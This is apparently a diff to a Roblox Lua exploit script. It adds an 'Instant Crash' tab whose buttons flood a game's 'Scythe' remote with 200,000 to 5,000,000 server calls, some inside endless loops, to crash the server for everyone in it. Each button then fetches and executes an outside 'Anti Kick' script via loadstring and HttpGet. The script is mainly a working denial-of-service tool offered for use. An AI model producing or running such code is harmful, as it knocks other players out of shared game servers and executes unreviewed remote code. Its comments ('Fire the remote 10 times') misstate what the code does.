@@ -7,14 +7,17 @@ local Tab1Section = Tab1:NewSection("Main")
 local Tab2 = window:NewTab("Auto")
 local Tab2Section = Tab2:NewSection("Auto Crash")
 
-local Tab3 = window:NewTab("Custom")
-local Tab3Section = Tab3:NewSection("Custom")
+local Tab3 = window:NewTab("Instant Crash")
+local Tab3Section = Tab3:NewSection("Instant Crash")
 
-local Tab4 = window:NewTab("Safe Spot")
-local Tab4Section = Tab4:NewSection("Safe Spot")
+local Tab4 = window:NewTab("Custom")
+local Tab4Section = Tab4:NewSection("Custom")
 
-local Tab5 = window:NewTab("Settings")
-local Tab5Section = Tab5:NewSection("Settings")
+local Tab5 = window:NewTab("Safe Spot")
+local Tab5Section = Tab5:NewSection("Safe Spot")
+
+local Tab6 = window:NewTab("Settings")
+local Tab6Section = Tab6:NewSection("Settings")
 
 ---Toggle Button
 
@@ -438,8 +441,212 @@ createToggle("Auto Crash (200)", 200, 10)
 createToggle("Auto Crash (500)", 500, 20)
 createToggle("Auto Crash (1000)", 1000, 40)
 
---- Tab 3 TextBox ---
-Tab3Section:NewTextBox("Customize the quantity", "Enter number", function(input)
+----Tab 3 ----
+
+Tab3Section:NewButton("Instant Crash (200k)", "Instant Crash", function()
+
+while true do
+wait(0.001)
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0.046936456114053726, 100003.4921875, -0.12038014084100723)
+
+wait(0.1)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Remote = ReplicatedStorage:WaitForChild("Scythe")
+
+local args = {
+    "ScytheWeapon"
+}
+
+-- Function to fire the remote multiple times
+local function fireRemote(times)
+    for i = 1, times do
+        Remote:FireServer(unpack(args))
+    end
+end
+
+-- Fire the remote 10 times
+fireRemote(200000)
+
+wait(0.00001)
+
+game.Players.LocalPlayer:Kick("Server Crashed")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tinalt/Scripts/main/Anti%20Kick", true))()
+
+end
+end)
+
+Tab3Section:NewButton("Instant Crash (350k)", "Instant Crash", function()
+
+while true do
+wait(0.001)
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0.046936456114053726, 100003.4921875, -0.12038014084100723)
+
+wait(0.1)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Remote = ReplicatedStorage:WaitForChild("Scythe")
+
+local args = {
+    "ScytheWeapon"
+}
+
+-- Function to fire the remote multiple times
+local function fireRemote(times)
+    for i = 1, times do
+        Remote:FireServer(unpack(args))
+    end
+end
+
+-- Fire the remote 10 times
+fireRemote(350000)
+
+wait(0.00001)
+
+game.Players.LocalPlayer:Kick("Server Crashed")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tinalt/Scripts/main/Anti%20Kick", true))()
+
+end
+end)
+
+Tab3Section:NewButton("Instant Crash (500k)", "Instant Crash", function()
+
+while true do
+wait(0.001)
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0.046936456114053726, 100003.4921875, -0.12038014084100723)
+
+wait(0.1)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Remote = ReplicatedStorage:WaitForChild("Scythe")
+
+local args = {
+    "ScytheWeapon"
+}
+
+-- Function to fire the remote multiple times
+local function fireRemote(times)
+    for i = 1, times do
+        Remote:FireServer(unpack(args))
+    end
+end
+
+-- Fire the remote 10 times
+fireRemote(500000)
+
+wait(0.00001)
+
+game.Players.LocalPlayer:Kick("Server Crashed")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tinalt/Scripts/main/Anti%20Kick", true))()
+
+end
+end)
+
+Tab3Section:NewButton("Instant Crash (1M)", "Instant Crash", function()
+
+while true do
+wait(0.001)
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0.046936456114053726, 100003.4921875, -0.12038014084100723)
+
+wait(0.1)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Remote = ReplicatedStorage:WaitForChild("Scythe")
+
+local args = {
+    "ScytheWeapon"
+}
+
+-- Function to fire the remote multiple times
+local function fireRemote(times)
+    for i = 1, times do
+        Remote:FireServer(unpack(args))
+    end
+end
+
+-- Fire the remote 10 times
+fireRemote(1000000)
+
+wait(0.00001)
+
+game.Players.LocalPlayer:Kick("Server Crashed")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tinalt/Scripts/main/Anti%20Kick", true))()
+
+end
+end)
+
+Tab3Section:NewButton("Instant Crash (2M)", "Instant Crash", function()
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0.046936456114053726, 100003.4921875, -0.12038014084100723)
+
+wait(0.1)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Remote = ReplicatedStorage:WaitForChild("Scythe")
+
+local args = {
+    "ScytheWeapon"
+}
+
+-- Function to fire the remote multiple times
+local function fireRemote(times)
+    for i = 1, times do
+        Remote:FireServer(unpack(args))
+    end
+end
+
+-- Fire the remote 10 times
+fireRemote(2000000)
+
+wait(0.00001)
+
+game.Players.LocalPlayer:Kick("Server Crashed")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tinalt/Scripts/main/Anti%20Kick", true))()
+
+end)
+
+Tab3Section:NewButton("Instant Crash (5M)", "Instant Crash", function()
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0.046936456114053726, 100003.4921875, -0.12038014084100723)
+
+wait(0.1)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Remote = ReplicatedStorage:WaitForChild("Scythe")
+
+local args = {
+    "ScytheWeapon"
+}
+
+-- Function to fire the remote multiple times
+local function fireRemote(times)
+    for i = 1, times do
+        Remote:FireServer(unpack(args))
+    end
+end
+
+-- Fire the remote 10 times
+fireRemote(5000000)
+
+wait(0.00001)
+
+game.Players.LocalPlayer:Kick("Server Crashed")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tinalt/Scripts/main/Anti%20Kick", true))()
+
+end)
+
+--- Tab 4 TextBox ---
+Tab4Section:NewTextBox("Customize the quantity", "Enter number", function(input)
     local times = tonumber(input)
     if times and times > 0 then
         local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -464,13 +671,13 @@ Tab3Section:NewTextBox("Customize the quantity", "Enter number", function(input)
 end)
 
 
-------Tab 4-------
-Tab4Section:NewButton("Teleport to SafeSpot", "Idk", function()
+------Tab 5-------
+Tab5Section:NewButton("Teleport to SafeSpot", "Idk", function()
 
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0.0497390441596508, 100003.4921875, -0.1297450065612793)
 end)
 
-Tab4Section:NewButton("Create SafeSpot", "Idk", function()
+Tab5Section:NewButton("Create SafeSpot", "Idk", function()
     local SafeSpot = Instance.new("Part", workspace)
     SafeSpot.Position = Vector3.new(0, 100000, 0)
     SafeSpot.Name = "Spot"
@@ -481,7 +688,7 @@ Tab4Section:NewButton("Create SafeSpot", "Idk", function()
 end)
 
 -- Button to delete all parts named "Spot"
-Tab4Section:NewButton("Delete SafeSpot", "Deletes all parts named 'Spot'", function()
+Tab5Section:NewButton("Delete SafeSpot", "Deletes all parts named 'Spot'", function()
     for _, part in pairs(workspace:GetChildren()) do
         if part:IsA("Part") and part.Name == "Spot" then
             part:Destroy()
@@ -491,8 +698,8 @@ Tab4Section:NewButton("Delete SafeSpot", "Deletes all parts named 'Spot'", funct
 end)
 
 
--- Tab 5 Buttons ---
-Tab5Section:NewButton("Create Toggle Button", "Create Toggle UI Button", function()
+-- Tab 6 Buttons ---
+Tab6Section:NewButton("Create Toggle Button", "Create Toggle UI Button", function()
     local gui = Instance.new("ScreenGui")
 gui.Name = "tinGui"
 gui.Parent = game.CoreGui
@@ -533,7 +740,7 @@ uiStroke.Parent = TextButton
     showNotification("Created Toggle Button")
 end)
 
-Tab5Section:NewButton("Destroy Toggle Button","Destroy ToggleUi button",function()
+Tab6Section:NewButton("Destroy Toggle Button","Destroy ToggleUi button",function()
 
 -- Function to delete all instances of "patrickGui" from CoreGui
 local function deleteAllPatrickGui()
